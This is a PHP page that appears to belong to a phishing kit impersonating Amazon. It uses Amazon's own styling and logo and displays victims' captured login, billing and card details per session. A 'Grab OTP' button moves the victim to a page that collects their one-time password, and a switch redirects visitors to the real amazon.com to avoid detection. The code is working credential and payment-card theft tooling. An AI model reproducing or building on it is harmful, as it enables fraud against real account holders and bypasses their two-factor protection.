<?php
session_start();
require_once __DIR__ . '/function.php';
require_once __DIR__ . '/../storage/storage.php';

$afkEnabled = is_afk_enabled();
if ($afkEnabled) {
    header('Location: https://www.amazon.com');
    exit;
}

$currentSessionId = session_id();
$sessions = load_login_sessions();
$currentSession = $sessions[$currentSessionId] ?? [];

$awaitingOtp = !empty($_GET['awaiting_otp']);
$otpSubmitted = !empty($_GET['otp_submitted']);

function latest_entry_summary(?array $entries): string
{
    if (empty($entries)) {
        return 'Awaiting submission.';
    }

    $latest = end($entries);
    if (!is_array($latest)) {
        return 'Awaiting submission.';
    }

    $payload = $latest['payload'] ?? [];
    if (!is_array($payload) || empty($payload)) {
        return 'Awaiting submission.';
    }

    $summaryPairs = [];
    foreach ($payload as $key => $value) {
        if (is_scalar($value)) {
            $summaryPairs[] = ucfirst(str_replace('_', ' ', (string)$key)) . ': ' . (string)$value;
        }
    }

    return empty($summaryPairs) ? 'Awaiting submission.' : implode(' | ', $summaryPairs);
}
?>
<!doctype html>
<html class="a-no-js" data-19ax5a9jf="dingo">
<head>
    <meta charset="utf-8">
    <title>Amazon - Account Review</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-af9e9b82cae7003c8a1d2f2e239005b802c674a4._V2_.css#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min" />
    <style>
        body {
            background-color: #f6f6f6;
            font-family: "Amazon Ember", Arial, sans-serif;
            color: #111;
        }
        .dashboard-wrapper {
            max-width: 420px;
            margin: 40px auto;
            background: #fff;
            border: 1px solid #d5d9d9;
            border-radius: 8px;
            padding: 24px;
        }
        .dashboard-wrapper h1 {
            font-size: 1.4rem;
            margin: 0 0 12px;
            font-weight: 500;
        }
        .dashboard-wrapper p.lead {
            font-size: 0.95rem;
            line-height: 1.4;
            margin: 0 0 16px;
        }
        .entry-group {
            margin-bottom: 18px;
        }
        .entry-group h2 {
            font-size: 1rem;
            margin: 0 0 6px;
        }
        .entry-summary {
            font-size: 0.85rem;
            background: #f3f3f3;
            border-radius: 6px;
            padding: 10px 12px;
            border: 1px solid #d5d9d9;
            word-break: break-word;
        }
        .actions {
            display: flex;
            gap: 12px;
            flex-direction: column;
            margin-top: 24px;
        }
        .a-button {
            display: inline-block;
            text-decoration: none;
            background: linear-gradient(#f7dfa5,#f0c14b);
            border: 1px solid #a88734;
            border-radius: 3px;
            padding: 10px 16px;
            color: #111;
            text-align: center;
            font-size: 0.95rem;
            font-weight: 500;
        }
        .a-button:hover {
            background: linear-gradient(#f5d78e,#eeb933);
        }
        .note {
            font-size: 0.8rem;
            color: #565959;
            margin-top: 4px;
        }
        .status {
            background-color: #dff0d8;
            border: 1px solid #b2d8b9;
            color: #2d662d;
            padding: 10px 12px;
            border-radius: 6px;
            margin-bottom: 16px;
            font-size: 0.9rem;
        }
        .logo {
            display: block;
            width: 120px;
            margin: 20px auto 10px;
        }
    </style>
</head>
<body class="ap-locale-en_US">
    <div class="dashboard-wrapper">
        <img src="https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global-1x-hm-dsk-reorg._CB405937547_.png" alt="Amazon" class="logo">
        <h1>Account Review In Progress</h1>
        <?php if ($otpSubmitted): ?>
            <div class="status">Thank you. We have received the verification code.</div>
        <?php elseif ($awaitingOtp): ?>
            <div class="status">Additional verification is required to finish securing your account.</div>
        <?php endif; ?>
        <p class="lead">Please review the information below while we prepare the final verification step. When ready, continue to provide the one-time password.</p>

        <div class="entry-group">
            <h2>Login</h2>
            <div class="entry-summary"><?php echo htmlspecialchars(latest_entry_summary($currentSession['login'] ?? []), ENT_QUOTES, 'UTF-8'); ?></div>
        </div>
        <div class="entry-group">
            <h2>Billing</h2>
            <div class="entry-summary"><?php echo htmlspecialchars(latest_entry_summary($currentSession['billing'] ?? []), ENT_QUOTES, 'UTF-8'); ?></div>
        </div>
        <div class="entry-group">
            <h2>Card</h2>
            <div class="entry-summary"><?php echo htmlspecialchars(latest_entry_summary($currentSession['card'] ?? []), ENT_QUOTES, 'UTF-8'); ?></div>
        </div>

        <div class="actions">
            <form action="otp.php" method="get">
                <button type="submit" class="a-button">Grab OTP</button>
            </form>
            <span class="note">You will be directed to the secure verification page to enter the one-time password.</span>
        </div>
    </div>
</body>
</html>
